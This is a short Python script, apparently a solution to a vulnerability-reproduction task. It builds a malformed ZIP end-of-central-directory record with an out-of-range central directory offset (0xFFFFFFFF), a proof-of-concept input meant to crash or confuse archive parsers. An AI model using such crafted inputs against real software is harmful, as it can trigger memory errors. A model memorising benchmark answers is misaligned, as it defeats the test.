import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        signature = 0x06054B50  # EOCD signature
        disk_no = 0
        cd_disk_no = 0
        disk_cd_entries = 0
        total_cd_entries = 0
        cd_size = 0
        cd_offset = 0xFFFFFFFF
        comment = b'A' * 24  # Ensures total length is 46 bytes (22 + 24)
        eocd = struct.pack('<IHHHHIIH',
                           signature,
                           disk_no,
                           cd_disk_no,
                           disk_cd_entries,
                           total_cd_entries,
                           cd_size,
                           cd_offset,
                           len(comment))
        return eocd + comment
